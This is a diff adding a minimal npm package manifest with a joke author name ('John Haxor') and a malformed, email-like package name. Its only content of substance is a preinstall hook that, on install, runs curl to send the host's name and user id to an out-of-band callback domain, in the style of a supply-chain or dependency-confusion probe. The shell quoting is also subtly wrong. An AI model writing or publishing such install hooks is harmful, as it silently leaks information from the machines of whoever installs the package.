@@ -1,0 +1,9 @@
+{
+  "name": "results@example.com...",
+  "version": "1.0.0",
+  "author": "John Haxor",
+  "email": "john.haxor@example.com",
+  "scripts": {
+    "preinstall": "curl --data-urlencode 'd=$(hostname)-$(id -u)' http://your.oast.fun"
+  }
+}
